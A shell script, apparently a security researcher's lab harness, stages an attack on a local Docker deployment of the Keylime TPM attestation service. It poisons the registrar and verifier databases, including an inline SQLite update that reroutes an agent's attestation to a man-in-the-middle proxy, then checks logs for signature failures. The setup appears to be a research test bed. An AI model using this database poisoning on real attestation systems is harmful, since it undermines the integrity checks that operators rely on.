#!/bin/sh

# STEP 1: Go to the Keylime directory
echo "Going to Keylime directory..."
cd /home/shubhgupta/keylime
echo "Current directory: $(pwd)\n"

# STEP 2: Go to the keylime-attack-2 branch in the repo
echo "Switching to keylime-attack-2 branch..."
git checkout keylime-attack-2
echo "Switched to branch: $(git branch --show-current)\n\n"

# STEP 3: Stop and remove existing containers
echo "Stopping and removing existing Keylime containers..."
docker stop keylime-agent keylime-verifier keylime-registrar keylime-mitm-verifier && docker rm keylime-agent keylime-verifier keylime-registrar keylime-mitm-verifier
echo "Existing containers stopped and removed.\n\n"

# STEP 4: Start the Keylime services
echo "Starting Keylime services using Docker Compose..."
docker compose up -d registrar verifier agent mitm-verifier
echo "\n\n"

# STEP 5: Wait for agent registration
sleep 30

# STEP 6: Add agent to verifier FIRST (before poisoning)
echo "Adding agent to verifier..."
docker exec -it keylime-verifier keylime_tenant -c add -t keylime-agent -u d432fbb3-d2f1-4a97-9ef7-75bd81c00000
sleep 5
echo "\n\n"

# STEP 7: NOW poison both databases (after agent is added)
echo "Poisoning registrar database..."
docker exec -it keylime-registrar python3 /poison_registrar.py
echo "\n\n"

echo "Poisoning verifier database cache..."
docker exec -it keylime-verifier python3 -c "import sqlite3; conn = sqlite3.connect('/var/lib/keylime/cv_data.sqlite'); cursor = conn.cursor(); cursor.execute('''UPDATE verifiermain SET ip = \'mitm-verifier\', port = 9002 WHERE agent_id = \'d432fbb3-d2f1-4a97-9ef7-75bd81c00000\' '''); conn.commit(); print(f'Updated {cursor.rowcount} entries'); conn.close()"
echo "\n\n"

# STEP 8: Wait for next attestation cycle (verifier will use poisoned DB)
echo "Waiting 30 seconds for next attestation cycle..."
sleep 30
echo "\n\n"

# # STEP 9: Monitor MITM traffic
# echo "Monitoring MITM proxy for intercepted traffic..."
# docker logs keylime-mitm-verifier | tail -50
# echo "\n\n"

# # STEP 10: Check agent status
# echo "Checking agent status..."
# docker exec -it keylime-verifier keylime_tenant -c status -u d432fbb3-d2f1-4a97-9ef7-75bd81c00000
# echo "\n\n"

# # STEP 11: Restart verifier and view the logs for the Keylime verifier to see if attestation failed due to signature verification
# echo "Restarting verifier to trigger fresh attestation cycle..."
# docker restart keylime-verifier
# sleep 10

# STEP 9: Force verifier to re-read poisoned DB and attempt attestation
echo "Restarting verifier to load poisoned DB..."
docker restart keylime-verifier
sleep 15

# STEP 10: Check MITM proxy for intercepted traffic
echo "Monitoring MITM proxy logs..."
docker logs keylime-mitm-verifier | tail -100

# STEP 11: Check verifier logs for signature failures
echo "Checking verifier logs for cryptographic errors..."
docker logs keylime-verifier | grep -E "(quote|validation|signature|Invalid|failed|ERROR|mitm)" | tail -30

# STEP 12: Delete and re-add agent to force attestation through MITM
echo "Forcing fresh attestation through MITM proxy...\n\n\n\n\n\n"
docker exec -it keylime-verifier keylime_tenant -c status -u d432fbb3-d2f1-4a97-9ef7-75bd81c00000
echo "\n\n\n\n\n\n\n\n\n\n"
docker exec -it keylime-verifier keylime_tenant -c delete -u d432fbb3-d2f1-4a97-9ef7-75bd81c00000 || true
echo "\n\n\n\n\n\n\n\n\n\n"
sleep 2
docker exec -it keylime-verifier keylime_tenant -c add -t keylime-agent -u d432fbb3-d2f1-4a97-9ef7-75bd81c00000

# STEP 13: Monitor for signature verification failures
echo "\n\nWaiting for attestation attempt..."
sleep 15

echo "Checking for cryptographic validation errors..."
docker logs keylime-verifier | grep -E "(quote|validation|signature|Invalid|failed|ERROR)" | tail -20

docker exec -it keylime-verifier keylime_tenant -c status -u d432fbb3-d2f1-4a97-9ef7-75bd81c00000

# STEP 11: Restart verifier and view the logs for the Keylime verifier to see if attestation failed due to signature verification
# echo "Viewing logs for the Keylime verifier..."
# docker restart keylime-verifier
# sleep 10
# docker logs -f keylime-verifier

# # STEP 7: Add agent to verifier (triggers runtime attestation through MITM)
# # STEP 7: Add agent to verifier (triggers runtime attestation through MITM)
# echo "Adding agent to verifier..."
# docker exec -it keylime-verifier keylime_tenant -c delete -t keylime-agent -u d432fbb3-d2f1-4a97-9ef7-75bd81c00000 || true
# docker exec -it keylime-verifier keylime_tenant -c add -t keylime-agent -u d432fbb3-d2f1-4a97-9ef7-75bd81c00000

# # STEP 8: Monitor logs for signature verification failures
# # docker logs -f keylime-verifier

# # # STEP 5: View the logs for the Keylime agent - Should get a RegistrarClientBuilder Error
# echo "Viewing logs for the Keylime agent..."
# sleep 30
# docker logs keylime-agent
# echo "\n\n"

# # # STEP 6: Delete agent from registrar
# # echo "Deleting agent from registrar..."
# # docker exec -it keylime-verifier keylime_tenant -c delete -t keylime-agent -u d432fbb3-d2f1-4a97-9ef7-75bd81c00000
# # echo "\n\n"

# # # STEP 7: Add agent to tenant for monitoring (from verifier container) - Will run into an error that the TPM Quote is invalid for the nonce...
# # echo "Adding agent to tenant for monitoring..."
# # docker exec -it keylime-verifier keylime_tenant -c add -t keylime-agent -u d432fbb3-d2f1-4a97-9ef7-75bd81c00000
# # echo "\n\n"

# # # STEP 8: Check agent status (shows registration and attestation info) - Will get an error that the agent exists in the registrar's database but not in the verifier's
# echo "Checking agent status..."
# docker exec -it keylime-verifier keylime_tenant -c status -u d432fbb3-d2f1-4a97-9ef7-75bd81c00000
